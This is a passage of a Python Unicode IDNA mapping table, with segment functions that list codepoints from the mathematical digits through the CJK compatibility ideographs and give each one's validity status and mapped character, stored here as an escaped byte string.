\'9\'),\n    (0x1D7D8, \'M\', \'0\'),\n    (0x1D7D9, \'M\', \'1\'),\n    (0x1D7DA, \'M\', \'2\'),\n    (0x1D7DB, \'M\', \'3\'),\n    (0x1D7DC, \'M\', \'4\'),\n    (0x1D7DD, \'M\', \'5\'),\n    (0x1D7DE, \'M\', \'6\'),\n    (0x1D7DF, \'M\', \'7\'),\n    (0x1D7E0, \'M\', \'8\'),\n    (0x1D7E1, \'M\', \'9\'),\n    (0x1D7E2, \'M\', \'0\'),\n    (0x1D7E3, \'M\', \'1\'),\n    (0x1D7E4, \'M\', \'2\'),\n    (0x1D7E5, \'M\', \'3\'),\n    (0x1D7E6, \'M\', \'4\'),\n    (0x1D7E7, \'M\', \'5\'),\n    (0x1D7E8, \'M\', \'6\'),\n    (0x1D7E9, \'M\', \'7\'),\n    (0x1D7EA, \'M\', \'8\'),\n    (0x1D7EB, \'M\', \'9\'),\n    (0x1D7EC, \'M\', \'0\'),\n    (0x1D7ED, \'M\', \'1\'),\n    (0x1D7EE, \'M\', \'2\'),\n    (0x1D7EF, \'M\', \'3\'),\n    (0x1D7F0, \'M\', \'4\'),\n    (0x1D7F1, \'M\', \'5\'),\n    (0x1D7F2, \'M\', \'6\'),\n    (0x1D7F3, \'M\', \'7\'),\n    (0x1D7F4, \'M\', \'8\'),\n    (0x1D7F5, \'M\', \'9\'),\n    (0x1D7F6, \'M\', \'0\'),\n    (0x1D7F7, \'M\', \'1\'),\n    (0x1D7F8, \'M\', \'2\'),\n    (0x1D7F9, \'M\', \'3\'),\n    (0x1D7FA, \'M\', \'4\'),\n    (0x1D7FB, \'M\', \'5\'),\n    (0x1D7FC, \'M\', \'6\'),\n    (0x1D7FD, \'M\', \'7\'),\n    (0x1D7FE, \'M\', \'8\'),\n    (0x1D7FF, \'M\', \'9\'),\n    (0x1D800, \'V\'),\n    (0x1DA8C, \'X\'),\n    (0x1DA9B, \'V\'),\n    (0x1DAA0, \'X\'),\n    (0x1DAA1, \'V\'),\n    (0x1DAB0, \'X\'),\n    (0x1DF00, \'V\'),\n    (0x1DF1F, \'X\'),\n    (0x1E000, \'V\'),\n    (0x1E007, \'X\'),\n    (0x1E008, \'V\'),\n    (0x1E019, \'X\'),\n    (0x1E01B, \'V\'),\n    (0x1E022, \'X\'),\n    (0x1E023, \'V\'),\n    (0x1E025, \'X\'),\n    (0x1E026, \'V\'),\n    (0x1E02B, \'X\'),\n    (0x1E100, \'V\'),\n    (0x1E12D, \'X\'),\n    (0x1E130, \'V\'),\n    (0x1E13E, \'X\'),\n    (0x1E140, \'V\'),\n    (0x1E14A, \'X\'),\n    (0x1E14E, \'V\'),\n    (0x1E150, \'X\'),\n    (0x1E290, \'V\'),\n    (0x1E2AF, \'X\'),\n    (0x1E2C0, \'V\'),\n    (0x1E2FA, \'X\'),\n    (0x1E2FF, \'V\'),\n    (0x1E300, \'X\'),\n    (0x1E7E0, \'V\'),\n    (0x1E7E7, \'X\'),\n    (0x1E7E8, \'V\'),\n    (0x1E7EC, \'X\'),\n    (0x1E7ED, \'V\'),\n    (0x1E7EF, \'X\'),\n    (0x1E7F0, \'V\'),\n    ]\n\ndef _seg_71() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x1E7FF, \'X\'),\n    (0x1E800, \'V\'),\n    (0x1E8C5, \'X\'),\n    (0x1E8C7, \'V\'),\n    (0x1E8D7, \'X\'),\n    (0x1E900, \'M\', \'\xf0\x9e\xa4\xa2\'),\n    (0x1E901, \'M\', \'\xf0\x9e\xa4\xa3\'),\n    (0x1E902, \'M\', \'\xf0\x9e\xa4\xa4\'),\n    (0x1E903, \'M\', \'\xf0\x9e\xa4\xa5\'),\n    (0x1E904, \'M\', \'\xf0\x9e\xa4\xa6\'),\n    (0x1E905, \'M\', \'\xf0\x9e\xa4\xa7\'),\n    (0x1E906, \'M\', \'\xf0\x9e\xa4\xa8\'),\n    (0x1E907, \'M\', \'\xf0\x9e\xa4\xa9\'),\n    (0x1E908, \'M\', \'\xf0\x9e\xa4\xaa\'),\n    (0x1E909, \'M\', \'\xf0\x9e\xa4\xab\'),\n    (0x1E90A, \'M\', \'\xf0\x9e\xa4\xac\'),\n    (0x1E90B, \'M\', \'\xf0\x9e\xa4\xad\'),\n    (0x1E90C, \'M\', \'\xf0\x9e\xa4\xae\'),\n    (0x1E90D, \'M\', \'\xf0\x9e\xa4\xaf\'),\n    (0x1E90E, \'M\', \'\xf0\x9e\xa4\xb0\'),\n    (0x1E90F, \'M\', \'\xf0\x9e\xa4\xb1\'),\n    (0x1E910, \'M\', \'\xf0\x9e\xa4\xb2\'),\n    (0x1E911, \'M\', \'\xf0\x9e\xa4\xb3\'),\n    (0x1E912, \'M\', \'\xf0\x9e\xa4\xb4\'),\n    (0x1E913, \'M\', \'\xf0\x9e\xa4\xb5\'),\n    (0x1E914, \'M\', \'\xf0\x9e\xa4\xb6\'),\n    (0x1E915, \'M\', \'\xf0\x9e\xa4\xb7\'),\n    (0x1E916, \'M\', \'\xf0\x9e\xa4\xb8\'),\n    (0x1E917, \'M\', \'\xf0\x9e\xa4\xb9\'),\n    (0x1E918, \'M\', \'\xf0\x9e\xa4\xba\'),\n    (0x1E919, \'M\', \'\xf0\x9e\xa4\xbb\'),\n    (0x1E91A, \'M\', \'\xf0\x9e\xa4\xbc\'),\n    (0x1E91B, \'M\', \'\xf0\x9e\xa4\xbd\'),\n    (0x1E91C, \'M\', \'\xf0\x9e\xa4\xbe\'),\n    (0x1E91D, \'M\', \'\xf0\x9e\xa4\xbf\'),\n    (0x1E91E, \'M\', \'\xf0\x9e\xa5\x80\'),\n    (0x1E91F, \'M\', \'\xf0\x9e\xa5\x81\'),\n    (0x1E920, \'M\', \'\xf0\x9e\xa5\x82\'),\n    (0x1E921, \'M\', \'\xf0\x9e\xa5\x83\'),\n    (0x1E922, \'V\'),\n    (0x1E94C, \'X\'),\n    (0x1E950, \'V\'),\n    (0x1E95A, \'X\'),\n    (0x1E95E, \'V\'),\n    (0x1E960, \'X\'),\n    (0x1EC71, \'V\'),\n    (0x1ECB5, \'X\'),\n    (0x1ED01, \'V\'),\n    (0x1ED3E, \'X\'),\n    (0x1EE00, \'M\', \'\xd8\xa7\'),\n    (0x1EE01, \'M\', \'\xd8\xa8\'),\n    (0x1EE02, \'M\', \'\xd8\xac\'),\n    (0x1EE03, \'M\', \'\xd8\xaf\'),\n    (0x1EE04, \'X\'),\n    (0x1EE05, \'M\', \'\xd9\x88\'),\n    (0x1EE06, \'M\', \'\xd8\xb2\'),\n    (0x1EE07, \'M\', \'\xd8\xad\'),\n    (0x1EE08, \'M\', \'\xd8\xb7\'),\n    (0x1EE09, \'M\', \'\xd9\x8a\'),\n    (0x1EE0A, \'M\', \'\xd9\x83\'),\n    (0x1EE0B, \'M\', \'\xd9\x84\'),\n    (0x1EE0C, \'M\', \'\xd9\x85\'),\n    (0x1EE0D, \'M\', \'\xd9\x86\'),\n    (0x1EE0E, \'M\', \'\xd8\xb3\'),\n    (0x1EE0F, \'M\', \'\xd8\xb9\'),\n    (0x1EE10, \'M\', \'\xd9\x81\'),\n    (0x1EE11, \'M\', \'\xd8\xb5\'),\n    (0x1EE12, \'M\', \'\xd9\x82\'),\n    (0x1EE13, \'M\', \'\xd8\xb1\'),\n    (0x1EE14, \'M\', \'\xd8\xb4\'),\n    (0x1EE15, \'M\', \'\xd8\xaa\'),\n    (0x1EE16, \'M\', \'\xd8\xab\'),\n    (0x1EE17, \'M\', \'\xd8\xae\'),\n    (0x1EE18, \'M\', \'\xd8\xb0\'),\n    (0x1EE19, \'M\', \'\xd8\xb6\'),\n    (0x1EE1A, \'M\', \'\xd8\xb8\'),\n    (0x1EE1B, \'M\', \'\xd8\xba\'),\n    (0x1EE1C, \'M\', \'\xd9\xae\'),\n    (0x1EE1D, \'M\', \'\xda\xba\'),\n    (0x1EE1E, \'M\', \'\xda\xa1\'),\n    (0x1EE1F, \'M\', \'\xd9\xaf\'),\n    (0x1EE20, \'X\'),\n    (0x1EE21, \'M\', \'\xd8\xa8\'),\n    (0x1EE22, \'M\', \'\xd8\xac\'),\n    (0x1EE23, \'X\'),\n    (0x1EE24, \'M\', \'\xd9\x87\'),\n    (0x1EE25, \'X\'),\n    (0x1EE27, \'M\', \'\xd8\xad\'),\n    (0x1EE28, \'X\'),\n    (0x1EE29, \'M\', \'\xd9\x8a\'),\n    (0x1EE2A, \'M\', \'\xd9\x83\'),\n    (0x1EE2B, \'M\', \'\xd9\x84\'),\n    (0x1EE2C, \'M\', \'\xd9\x85\'),\n    (0x1EE2D, \'M\', \'\xd9\x86\'),\n    (0x1EE2E, \'M\', \'\xd8\xb3\'),\n    (0x1EE2F, \'M\', \'\xd8\xb9\'),\n    (0x1EE30, \'M\', \'\xd9\x81\'),\n    (0x1EE31, \'M\', \'\xd8\xb5\'),\n    (0x1EE32, \'M\', \'\xd9\x82\'),\n    (0x1EE33, \'X\'),\n    ]\n\ndef _seg_72() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x1EE34, \'M\', \'\xd8\xb4\'),\n    (0x1EE35, \'M\', \'\xd8\xaa\'),\n    (0x1EE36, \'M\', \'\xd8\xab\'),\n    (0x1EE37, \'M\', \'\xd8\xae\'),\n    (0x1EE38, \'X\'),\n    (0x1EE39, \'M\', \'\xd8\xb6\'),\n    (0x1EE3A, \'X\'),\n    (0x1EE3B, \'M\', \'\xd8\xba\'),\n    (0x1EE3C, \'X\'),\n    (0x1EE42, \'M\', \'\xd8\xac\'),\n    (0x1EE43, \'X\'),\n    (0x1EE47, \'M\', \'\xd8\xad\'),\n    (0x1EE48, \'X\'),\n    (0x1EE49, \'M\', \'\xd9\x8a\'),\n    (0x1EE4A, \'X\'),\n    (0x1EE4B, \'M\', \'\xd9\x84\'),\n    (0x1EE4C, \'X\'),\n    (0x1EE4D, \'M\', \'\xd9\x86\'),\n    (0x1EE4E, \'M\', \'\xd8\xb3\'),\n    (0x1EE4F, \'M\', \'\xd8\xb9\'),\n    (0x1EE50, \'X\'),\n    (0x1EE51, \'M\', \'\xd8\xb5\'),\n    (0x1EE52, \'M\', \'\xd9\x82\'),\n    (0x1EE53, \'X\'),\n    (0x1EE54, \'M\', \'\xd8\xb4\'),\n    (0x1EE55, \'X\'),\n    (0x1EE57, \'M\', \'\xd8\xae\'),\n    (0x1EE58, \'X\'),\n    (0x1EE59, \'M\', \'\xd8\xb6\'),\n    (0x1EE5A, \'X\'),\n    (0x1EE5B, \'M\', \'\xd8\xba\'),\n    (0x1EE5C, \'X\'),\n    (0x1EE5D, \'M\', \'\xda\xba\'),\n    (0x1EE5E, \'X\'),\n    (0x1EE5F, \'M\', \'\xd9\xaf\'),\n    (0x1EE60, \'X\'),\n    (0x1EE61, \'M\', \'\xd8\xa8\'),\n    (0x1EE62, \'M\', \'\xd8\xac\'),\n    (0x1EE63, \'X\'),\n    (0x1EE64, \'M\', \'\xd9\x87\'),\n    (0x1EE65, \'X\'),\n    (0x1EE67, \'M\', \'\xd8\xad\'),\n    (0x1EE68, \'M\', \'\xd8\xb7\'),\n    (0x1EE69, \'M\', \'\xd9\x8a\'),\n    (0x1EE6A, \'M\', \'\xd9\x83\'),\n    (0x1EE6B, \'X\'),\n    (0x1EE6C, \'M\', \'\xd9\x85\'),\n    (0x1EE6D, \'M\', \'\xd9\x86\'),\n    (0x1EE6E, \'M\', \'\xd8\xb3\'),\n    (0x1EE6F, \'M\', \'\xd8\xb9\'),\n    (0x1EE70, \'M\', \'\xd9\x81\'),\n    (0x1EE71, \'M\', \'\xd8\xb5\'),\n    (0x1EE72, \'M\', \'\xd9\x82\'),\n    (0x1EE73, \'X\'),\n    (0x1EE74, \'M\', \'\xd8\xb4\'),\n    (0x1EE75, \'M\', \'\xd8\xaa\'),\n    (0x1EE76, \'M\', \'\xd8\xab\'),\n    (0x1EE77, \'M\', \'\xd8\xae\'),\n    (0x1EE78, \'X\'),\n    (0x1EE79, \'M\', \'\xd8\xb6\'),\n    (0x1EE7A, \'M\', \'\xd8\xb8\'),\n    (0x1EE7B, \'M\', \'\xd8\xba\'),\n    (0x1EE7C, \'M\', \'\xd9\xae\'),\n    (0x1EE7D, \'X\'),\n    (0x1EE7E, \'M\', \'\xda\xa1\'),\n    (0x1EE7F, \'X\'),\n    (0x1EE80, \'M\', \'\xd8\xa7\'),\n    (0x1EE81, \'M\', \'\xd8\xa8\'),\n    (0x1EE82, \'M\', \'\xd8\xac\'),\n    (0x1EE83, \'M\', \'\xd8\xaf\'),\n    (0x1EE84, \'M\', \'\xd9\x87\'),\n    (0x1EE85, \'M\', \'\xd9\x88\'),\n    (0x1EE86, \'M\', \'\xd8\xb2\'),\n    (0x1EE87, \'M\', \'\xd8\xad\'),\n    (0x1EE88, \'M\', \'\xd8\xb7\'),\n    (0x1EE89, \'M\', \'\xd9\x8a\'),\n    (0x1EE8A, \'X\'),\n    (0x1EE8B, \'M\', \'\xd9\x84\'),\n    (0x1EE8C, \'M\', \'\xd9\x85\'),\n    (0x1EE8D, \'M\', \'\xd9\x86\'),\n    (0x1EE8E, \'M\', \'\xd8\xb3\'),\n    (0x1EE8F, \'M\', \'\xd8\xb9\'),\n    (0x1EE90, \'M\', \'\xd9\x81\'),\n    (0x1EE91, \'M\', \'\xd8\xb5\'),\n    (0x1EE92, \'M\', \'\xd9\x82\'),\n    (0x1EE93, \'M\', \'\xd8\xb1\'),\n    (0x1EE94, \'M\', \'\xd8\xb4\'),\n    (0x1EE95, \'M\', \'\xd8\xaa\'),\n    (0x1EE96, \'M\', \'\xd8\xab\'),\n    (0x1EE97, \'M\', \'\xd8\xae\'),\n    (0x1EE98, \'M\', \'\xd8\xb0\'),\n    (0x1EE99, \'M\', \'\xd8\xb6\'),\n    (0x1EE9A, \'M\', \'\xd8\xb8\'),\n    (0x1EE9B, \'M\', \'\xd8\xba\'),\n    (0x1EE9C, \'X\'),\n    (0x1EEA1, \'M\', \'\xd8\xa8\'),\n    (0x1EEA2, \'M\', \'\xd8\xac\'),\n    (0x1EEA3, \'M\', \'\xd8\xaf\'),\n    (0x1EEA4, \'X\'),\n    (0x1EEA5, \'M\', \'\xd9\x88\'),\n    ]\n\ndef _seg_73() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x1EEA6, \'M\', \'\xd8\xb2\'),\n    (0x1EEA7, \'M\', \'\xd8\xad\'),\n    (0x1EEA8, \'M\', \'\xd8\xb7\'),\n    (0x1EEA9, \'M\', \'\xd9\x8a\'),\n    (0x1EEAA, \'X\'),\n    (0x1EEAB, \'M\', \'\xd9\x84\'),\n    (0x1EEAC, \'M\', \'\xd9\x85\'),\n    (0x1EEAD, \'M\', \'\xd9\x86\'),\n    (0x1EEAE, \'M\', \'\xd8\xb3\'),\n    (0x1EEAF, \'M\', \'\xd8\xb9\'),\n    (0x1EEB0, \'M\', \'\xd9\x81\'),\n    (0x1EEB1, \'M\', \'\xd8\xb5\'),\n    (0x1EEB2, \'M\', \'\xd9\x82\'),\n    (0x1EEB3, \'M\', \'\xd8\xb1\'),\n    (0x1EEB4, \'M\', \'\xd8\xb4\'),\n    (0x1EEB5, \'M\', \'\xd8\xaa\'),\n    (0x1EEB6, \'M\', \'\xd8\xab\'),\n    (0x1EEB7, \'M\', \'\xd8\xae\'),\n    (0x1EEB8, \'M\', \'\xd8\xb0\'),\n    (0x1EEB9, \'M\', \'\xd8\xb6\'),\n    (0x1EEBA, \'M\', \'\xd8\xb8\'),\n    (0x1EEBB, \'M\', \'\xd8\xba\'),\n    (0x1EEBC, \'X\'),\n    (0x1EEF0, \'V\'),\n    (0x1EEF2, \'X\'),\n    (0x1F000, \'V\'),\n    (0x1F02C, \'X\'),\n    (0x1F030, \'V\'),\n    (0x1F094, \'X\'),\n    (0x1F0A0, \'V\'),\n    (0x1F0AF, \'X\'),\n    (0x1F0B1, \'V\'),\n    (0x1F0C0, \'X\'),\n    (0x1F0C1, \'V\'),\n    (0x1F0D0, \'X\'),\n    (0x1F0D1, \'V\'),\n    (0x1F0F6, \'X\'),\n    (0x1F101, \'3\', \'0,\'),\n    (0x1F102, \'3\', \'1,\'),\n    (0x1F103, \'3\', \'2,\'),\n    (0x1F104, \'3\', \'3,\'),\n    (0x1F105, \'3\', \'4,\'),\n    (0x1F106, \'3\', \'5,\'),\n    (0x1F107, \'3\', \'6,\'),\n    (0x1F108, \'3\', \'7,\'),\n    (0x1F109, \'3\', \'8,\'),\n    (0x1F10A, \'3\', \'9,\'),\n    (0x1F10B, \'V\'),\n    (0x1F110, \'3\', \'(a)\'),\n    (0x1F111, \'3\', \'(b)\'),\n    (0x1F112, \'3\', \'(c)\'),\n    (0x1F113, \'3\', \'(d)\'),\n    (0x1F114, \'3\', \'(e)\'),\n    (0x1F115, \'3\', \'(f)\'),\n    (0x1F116, \'3\', \'(g)\'),\n    (0x1F117, \'3\', \'(h)\'),\n    (0x1F118, \'3\', \'(i)\'),\n    (0x1F119, \'3\', \'(j)\'),\n    (0x1F11A, \'3\', \'(k)\'),\n    (0x1F11B, \'3\', \'(l)\'),\n    (0x1F11C, \'3\', \'(m)\'),\n    (0x1F11D, \'3\', \'(n)\'),\n    (0x1F11E, \'3\', \'(o)\'),\n    (0x1F11F, \'3\', \'(p)\'),\n    (0x1F120, \'3\', \'(q)\'),\n    (0x1F121, \'3\', \'(r)\'),\n    (0x1F122, \'3\', \'(s)\'),\n    (0x1F123, \'3\', \'(t)\'),\n    (0x1F124, \'3\', \'(u)\'),\n    (0x1F125, \'3\', \'(v)\'),\n    (0x1F126, \'3\', \'(w)\'),\n    (0x1F127, \'3\', \'(x)\'),\n    (0x1F128, \'3\', \'(y)\'),\n    (0x1F129, \'3\', \'(z)\'),\n    (0x1F12A, \'M\', \'\xe3\x80\x94s\xe3\x80\x95\'),\n    (0x1F12B, \'M\', \'c\'),\n    (0x1F12C, \'M\', \'r\'),\n    (0x1F12D, \'M\', \'cd\'),\n    (0x1F12E, \'M\', \'wz\'),\n    (0x1F12F, \'V\'),\n    (0x1F130, \'M\', \'a\'),\n    (0x1F131, \'M\', \'b\'),\n    (0x1F132, \'M\', \'c\'),\n    (0x1F133, \'M\', \'d\'),\n    (0x1F134, \'M\', \'e\'),\n    (0x1F135, \'M\', \'f\'),\n    (0x1F136, \'M\', \'g\'),\n    (0x1F137, \'M\', \'h\'),\n    (0x1F138, \'M\', \'i\'),\n    (0x1F139, \'M\', \'j\'),\n    (0x1F13A, \'M\', \'k\'),\n    (0x1F13B, \'M\', \'l\'),\n    (0x1F13C, \'M\', \'m\'),\n    (0x1F13D, \'M\', \'n\'),\n    (0x1F13E, \'M\', \'o\'),\n    (0x1F13F, \'M\', \'p\'),\n    (0x1F140, \'M\', \'q\'),\n    (0x1F141, \'M\', \'r\'),\n    (0x1F142, \'M\', \'s\'),\n    (0x1F143, \'M\', \'t\'),\n    ]\n\ndef _seg_74() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x1F144, \'M\', \'u\'),\n    (0x1F145, \'M\', \'v\'),\n    (0x1F146, \'M\', \'w\'),\n    (0x1F147, \'M\', \'x\'),\n    (0x1F148, \'M\', \'y\'),\n    (0x1F149, \'M\', \'z\'),\n    (0x1F14A, \'M\', \'hv\'),\n    (0x1F14B, \'M\', \'mv\'),\n    (0x1F14C, \'M\', \'sd\'),\n    (0x1F14D, \'M\', \'ss\'),\n    (0x1F14E, \'M\', \'ppv\'),\n    (0x1F14F, \'M\', \'wc\'),\n    (0x1F150, \'V\'),\n    (0x1F16A, \'M\', \'mc\'),\n    (0x1F16B, \'M\', \'md\'),\n    (0x1F16C, \'M\', \'mr\'),\n    (0x1F16D, \'V\'),\n    (0x1F190, \'M\', \'dj\'),\n    (0x1F191, \'V\'),\n    (0x1F1AE, \'X\'),\n    (0x1F1E6, \'V\'),\n    (0x1F200, \'M\', \'\xe3\x81\xbb\xe3\x81\x8b\'),\n    (0x1F201, \'M\', \'\xe3\x82\xb3\xe3\x82\xb3\'),\n    (0x1F202, \'M\', \'\xe3\x82\xb5\'),\n    (0x1F203, \'X\'),\n    (0x1F210, \'M\', \'\xe6\x89\x8b\'),\n    (0x1F211, \'M\', \'\xe5\xad\x97\'),\n    (0x1F212, \'M\', \'\xe5\x8f\x8c\'),\n    (0x1F213, \'M\', \'\xe3\x83\x87\'),\n    (0x1F214, \'M\', \'\xe4\xba\x8c\'),\n    (0x1F215, \'M\', \'\xe5\xa4\x9a\'),\n    (0x1F216, \'M\', \'\xe8\xa7\xa3\'),\n    (0x1F217, \'M\', \'\xe5\xa4\xa9\'),\n    (0x1F218, \'M\', \'\xe4\xba\xa4\'),\n    (0x1F219, \'M\', \'\xe6\x98\xa0\'),\n    (0x1F21A, \'M\', \'\xe7\x84\xa1\'),\n    (0x1F21B, \'M\', \'\xe6\x96\x99\'),\n    (0x1F21C, \'M\', \'\xe5\x89\x8d\'),\n    (0x1F21D, \'M\', \'\xe5\xbe\x8c\'),\n    (0x1F21E, \'M\', \'\xe5\x86\x8d\'),\n    (0x1F21F, \'M\', \'\xe6\x96\xb0\'),\n    (0x1F220, \'M\', \'\xe5\x88\x9d\'),\n    (0x1F221, \'M\', \'\xe7\xb5\x82\'),\n    (0x1F222, \'M\', \'\xe7\x94\x9f\'),\n    (0x1F223, \'M\', \'\xe8\xb2\xa9\'),\n    (0x1F224, \'M\', \'\xe5\xa3\xb0\'),\n    (0x1F225, \'M\', \'\xe5\x90\xb9\'),\n    (0x1F226, \'M\', \'\xe6\xbc\x94\'),\n    (0x1F227, \'M\', \'\xe6\x8a\x95\'),\n    (0x1F228, \'M\', \'\xe6\x8d\x95\'),\n    (0x1F229, \'M\', \'\xe4\xb8\x80\'),\n    (0x1F22A, \'M\', \'\xe4\xb8\x89\'),\n    (0x1F22B, \'M\', \'\xe9\x81\x8a\'),\n    (0x1F22C, \'M\', \'\xe5\xb7\xa6\'),\n    (0x1F22D, \'M\', \'\xe4\xb8\xad\'),\n    (0x1F22E, \'M\', \'\xe5\x8f\xb3\'),\n    (0x1F22F, \'M\', \'\xe6\x8c\x87\'),\n    (0x1F230, \'M\', \'\xe8\xb5\xb0\'),\n    (0x1F231, \'M\', \'\xe6\x89\x93\'),\n    (0x1F232, \'M\', \'\xe7\xa6\x81\'),\n    (0x1F233, \'M\', \'\xe7\xa9\xba\'),\n    (0x1F234, \'M\', \'\xe5\x90\x88\'),\n    (0x1F235, \'M\', \'\xe6\xba\x80\'),\n    (0x1F236, \'M\', \'\xe6\x9c\x89\'),\n    (0x1F237, \'M\', \'\xe6\x9c\x88\'),\n    (0x1F238, \'M\', \'\xe7\x94\xb3\'),\n    (0x1F239, \'M\', \'\xe5\x89\xb2\'),\n    (0x1F23A, \'M\', \'\xe5\x96\xb6\'),\n    (0x1F23B, \'M\', \'\xe9\x85\x8d\'),\n    (0x1F23C, \'X\'),\n    (0x1F240, \'M\', \'\xe3\x80\x94\xe6\x9c\xac\xe3\x80\x95\'),\n    (0x1F241, \'M\', \'\xe3\x80\x94\xe4\xb8\x89\xe3\x80\x95\'),\n    (0x1F242, \'M\', \'\xe3\x80\x94\xe4\xba\x8c\xe3\x80\x95\'),\n    (0x1F243, \'M\', \'\xe3\x80\x94\xe5\xae\x89\xe3\x80\x95\'),\n    (0x1F244, \'M\', \'\xe3\x80\x94\xe7\x82\xb9\xe3\x80\x95\'),\n    (0x1F245, \'M\', \'\xe3\x80\x94\xe6\x89\x93\xe3\x80\x95\'),\n    (0x1F246, \'M\', \'\xe3\x80\x94\xe7\x9b\x97\xe3\x80\x95\'),\n    (0x1F247, \'M\', \'\xe3\x80\x94\xe5\x8b\x9d\xe3\x80\x95\'),\n    (0x1F248, \'M\', \'\xe3\x80\x94\xe6\x95\x97\xe3\x80\x95\'),\n    (0x1F249, \'X\'),\n    (0x1F250, \'M\', \'\xe5\xbe\x97\'),\n    (0x1F251, \'M\', \'\xe5\x8f\xaf\'),\n    (0x1F252, \'X\'),\n    (0x1F260, \'V\'),\n    (0x1F266, \'X\'),\n    (0x1F300, \'V\'),\n    (0x1F6D8, \'X\'),\n    (0x1F6DD, \'V\'),\n    (0x1F6ED, \'X\'),\n    (0x1F6F0, \'V\'),\n    (0x1F6FD, \'X\'),\n    (0x1F700, \'V\'),\n    (0x1F774, \'X\'),\n    (0x1F780, \'V\'),\n    (0x1F7D9, \'X\'),\n    (0x1F7E0, \'V\'),\n    (0x1F7EC, \'X\'),\n    (0x1F7F0, \'V\'),\n    (0x1F7F1, \'X\'),\n    (0x1F800, \'V\'),\n    ]\n\ndef _seg_75() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x1F80C, \'X\'),\n    (0x1F810, \'V\'),\n    (0x1F848, \'X\'),\n    (0x1F850, \'V\'),\n    (0x1F85A, \'X\'),\n    (0x1F860, \'V\'),\n    (0x1F888, \'X\'),\n    (0x1F890, \'V\'),\n    (0x1F8AE, \'X\'),\n    (0x1F8B0, \'V\'),\n    (0x1F8B2, \'X\'),\n    (0x1F900, \'V\'),\n    (0x1FA54, \'X\'),\n    (0x1FA60, \'V\'),\n    (0x1FA6E, \'X\'),\n    (0x1FA70, \'V\'),\n    (0x1FA75, \'X\'),\n    (0x1FA78, \'V\'),\n    (0x1FA7D, \'X\'),\n    (0x1FA80, \'V\'),\n    (0x1FA87, \'X\'),\n    (0x1FA90, \'V\'),\n    (0x1FAAD, \'X\'),\n    (0x1FAB0, \'V\'),\n    (0x1FABB, \'X\'),\n    (0x1FAC0, \'V\'),\n    (0x1FAC6, \'X\'),\n    (0x1FAD0, \'V\'),\n    (0x1FADA, \'X\'),\n    (0x1FAE0, \'V\'),\n    (0x1FAE8, \'X\'),\n    (0x1FAF0, \'V\'),\n    (0x1FAF7, \'X\'),\n    (0x1FB00, \'V\'),\n    (0x1FB93, \'X\'),\n    (0x1FB94, \'V\'),\n    (0x1FBCB, \'X\'),\n    (0x1FBF0, \'M\', \'0\'),\n    (0x1FBF1, \'M\', \'1\'),\n    (0x1FBF2, \'M\', \'2\'),\n    (0x1FBF3, \'M\', \'3\'),\n    (0x1FBF4, \'M\', \'4\'),\n    (0x1FBF5, \'M\', \'5\'),\n    (0x1FBF6, \'M\', \'6\'),\n    (0x1FBF7, \'M\', \'7\'),\n    (0x1FBF8, \'M\', \'8\'),\n    (0x1FBF9, \'M\', \'9\'),\n    (0x1FBFA, \'X\'),\n    (0x20000, \'V\'),\n    (0x2A6E0, \'X\'),\n    (0x2A700, \'V\'),\n    (0x2B739, \'X\'),\n    (0x2B740, \'V\'),\n    (0x2B81E, \'X\'),\n    (0x2B820, \'V\'),\n    (0x2CEA2, \'X\'),\n    (0x2CEB0, \'V\'),\n    (0x2EBE1, \'X\'),\n    (0x2F800, \'M\', \'\xe4\xb8\xbd\'),\n    (0x2F801, \'M\', \'\xe4\xb8\xb8\'),\n    (0x2F802, \'M\', \'\xe4\xb9\x81\'),\n    (0x2F803, \'M\', \'\xf0\xa0\x84\xa2\'),\n    (0x2F804, \'M\', \'\xe4\xbd\xa0\'),\n    (0x2F805, \'M\', \'\xe4\xbe\xae\'),\n    (0x2F806, \'M\', \'\xe4\xbe\xbb\'),\n    (0x2F807, \'M\', \'\xe5\x80\x82\'),\n    (0x2F808, \'M\', \'\xe5\x81\xba\'),\n    (0x2F809, \'M\', \'\xe5\x82\x99\'),\n    (0x2F80A, \'M\', \'\xe5\x83\xa7\'),\n    (0x2F80B, \'M\', \'\xe5\x83\x8f\'),\n    (0x2F80C, \'M\', \'\xe3\x92\x9e\'),\n    (0x2F80D, \'M\', \'\xf0\xa0\x98\xba\'),\n    (0x2F80E, \'M\', \'\xe5\x85\x8d\'),\n    (0x2F80F, \'M\', \'\xe5\x85\x94\'),\n    (0x2F810, \'M\', \'\xe5\x85\xa4\'),\n    (0x2F811, \'M\', \'\xe5\x85\xb7\'),\n    (0x2F812, \'M\', \'\xf0\xa0\x94\x9c\'),\n    (0x2F813, \'M\', \'\xe3\x92\xb9\'),\n    (0x2F814, \'M\', \'\xe5\x85\xa7\'),\n    (0x2F815, \'M\', \'\xe5\x86\x8d\'),\n    (0x2F816, \'M\', \'\xf0\xa0\x95\x8b\'),\n    (0x2F817, \'M\', \'\xe5\x86\x97\'),\n    (0x2F818, \'M\', \'\xe5\x86\xa4\'),\n    (0x2F819, \'M\', \'\xe4\xbb\x8c\'),\n    (0x2F81A, \'M\', \'\xe5\x86\xac\'),\n    (0x2F81B, \'M\', \'\xe5\x86\xb5\'),\n    (0x2F81C, \'M\', \'\xf0\xa9\x87\x9f\'),\n    (0x2F81D, \'M\', \'\xe5\x87\xb5\'),\n    (0x2F81E, \'M\', \'\xe5\x88\x83\'),\n    (0x2F81F, \'M\', \'\xe3\x93\x9f\'),\n    (0x2F820, \'M\', \'\xe5\x88\xbb\'),\n    (0x2F821, \'M\', \'\xe5\x89\x86\'),\n    (0x2F822, \'M\', \'\xe5\x89\xb2\'),\n    (0x2F823, \'M\', \'\xe5\x89\xb7\'),\n    (0x2F824, \'M\', \'\xe3\x94\x95\'),\n    (0x2F825, \'M\', \'\xe5\x8b\x87\'),\n    (0x2F826, \'M\', \'\xe5\x8b\x89\'),\n    (0x2F827, \'M\', \'\xe5\x8b\xa4\'),\n    (0x2F828, \'M\', \'\xe5\x8b\xba\'),\n    (0x2F829, \'M\', \'\xe5\x8c\x85\'),\n    ]\n\ndef _seg_76() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x2F82A, \'M\', \'\xe5\x8c\x86\'),\n    (0x2F82B, \'M\', \'\xe5\x8c\x97\'),\n    (0x2F82C, \'M\', 